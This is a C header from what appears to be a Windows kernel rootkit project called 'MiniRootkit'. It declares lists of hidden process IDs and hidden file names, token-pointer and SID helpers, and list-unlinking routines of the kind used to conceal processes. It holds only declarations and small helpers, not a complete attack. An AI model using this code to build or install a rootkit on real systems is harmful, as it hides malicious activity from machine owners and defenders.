#ifndef __UTILS_H__
#define __UTILS_H__

#include <ntdef.h>
#include <ntifs.h>
#include <wdm.h>
// Include minwindef.h after ntifs.h and wdm.h to avoid redefinition errors
#include <assert.h>
#include <minwindef.h>
#include "shared/rootkit_uapi.h"
#include "structures.h"

#define MODULE_NAME "MiniRootkit"
#define DBG_PREFIX "[" MODULE_NAME "] "
#define MyDbgPrint(_fmt, ...) DbgPrint(DBG_PREFIX _fmt "\n", ##__VA_ARGS__)

#define FIELD_VALUE(_struct, _type, _offset) (*(_type *)((PBYTE)(_struct) + (_offset)))

// Round down to the previous multiple of _mult (_mult must be a power of 2)
#define MY_ALIGN_DOWN_BY(_n, _mult) ((_n) & ~((_mult) - 1))
// Round up to the next multiple of _mult (_mult must be a power of 2)
#define MY_ALIGN_UP_BY(_n, _mult) MY_ALIGN_DOWN_BY((_n) + (_mult) - 1, _mult)
// Align pointer down (to the previous multiple of 8 on 64-bit systems)
#define MY_ALIGN_DOWN_PTR(_n) MY_ALIGN_DOWN_BY(_n, sizeof(ULONG_PTR))
// Align pointer up (to the next multiple of 8 on 64-bit systems)
#define MY_ALIGN_UP_PTR(_n) MY_ALIGN_UP_BY(_n, sizeof(ULONG_PTR))

#define HIDDEN_PID_LIST_SIZE 256
#define HIDDEN_FILE_LIST_SIZE 64

#pragma pack(push, 1)  // Pack structs to reduce memory footprint
typedef struct _HIDDEN_PID {
    DWORD ProcessId;         // 0x000
    _PEPROCESS pProc;        // 0x004
} HIDDEN_PID, *PHIDDEN_PID;  // Total size: 12 bytes (would be 16 without packing)

typedef struct _HIDDEN_FILE {
    ULONG FileNameLength : 30;  // 0x000 (lower 30 bits)
    ULONG MatchType : 2;        // 0x000 (upper 2 bits) [type is actually MATCH_TYPE]
    WCHAR FileName[30];         // 0x004
} HIDDEN_FILE, *PHIDDEN_FILE;   // Total size: 64 bytes
#pragma pack(pop)

extern HIDDEN_PID gHiddenPidList[HIDDEN_PID_LIST_SIZE];
extern HIDDEN_FILE gHiddenFileList[HIDDEN_FILE_LIST_SIZE];

static inline PTOKEN GetTokenAddress(IN CONST EX_FAST_REF *pToken) {
    return (PTOKEN)(pToken->Value & ~0xFULL);
}

static inline DWORD GetPid(IN CONST EPROCESS *pProc) {
    return (DWORD)(CONST ULONG_PTR)pProc->UniqueProcessId;
}

static inline ULONGLONG GetAuthorityValue(IN CONST SID_IDENTIFIER_AUTHORITY *pAuthority) {
    return ((ULONGLONG)pAuthority->Value[5] << 0x00) | ((ULONGLONG)pAuthority->Value[4] << 0x08) |
           ((ULONGLONG)pAuthority->Value[3] << 0x10) | ((ULONGLONG)pAuthority->Value[2] << 0x18) |
           ((ULONGLONG)pAuthority->Value[1] << 0x20) | ((ULONGLONG)pAuthority->Value[0] << 0x28);
}

static inline VOID InsertElementAfter(IN PLIST_ENTRY pListHead, IN PLIST_ENTRY pNewEntry) {
    PLIST_ENTRY pNext = pListHead->Flink;
    pListHead->Flink = pNewEntry;
    pNewEntry->Blink = pListHead;
    pNewEntry->Flink = pNext;
    if (pNext != NULL) {
        pNext->Blink = pNewEntry;
    }
}

static inline VOID RemoveListEntry(IN PLIST_ENTRY pEntry, IN BOOL bClearLinks) {
    PLIST_ENTRY pPrev = pEntry->Blink;
    PLIST_ENTRY pNext = pEntry->Flink;
    if (pPrev != NULL) {
        pPrev->Flink = pNext;
    }
    if (pNext != NULL) {
        pNext->Blink = pPrev;
    }
    if (bClearLinks) {
        pEntry->Flink = NULL;
        pEntry->Blink = NULL;
    }
}

NTSTATUS AddHiddenPid(IN DWORD dwPid, IN _PEPROCESS pProc);
_PEPROCESS GetHiddenPidEprocess(IN DWORD dwPid);
NTSTATUS RemoveHiddenPid(IN DWORD dwPid);

NTSTATUS AddHiddenFile(IN LPCWSTR lpFileName, IN ULONG ulFileNameLength, IN MATCH_TYPE matchType);
BOOL IsFileHidden(IN LPCWSTR lpFileName, IN ULONG ulFileNameLength);
NTSTATUS RemoveHiddenFile(IN LPCWSTR lpFileName, IN ULONG ulFileNameLength);

VOID PrintSidInfo(IN CONST SID_AND_ATTRIBUTES *pUserAndGroups, IN ULONG ulUserAndGroupCount);

#endif  // __UTILS_H__
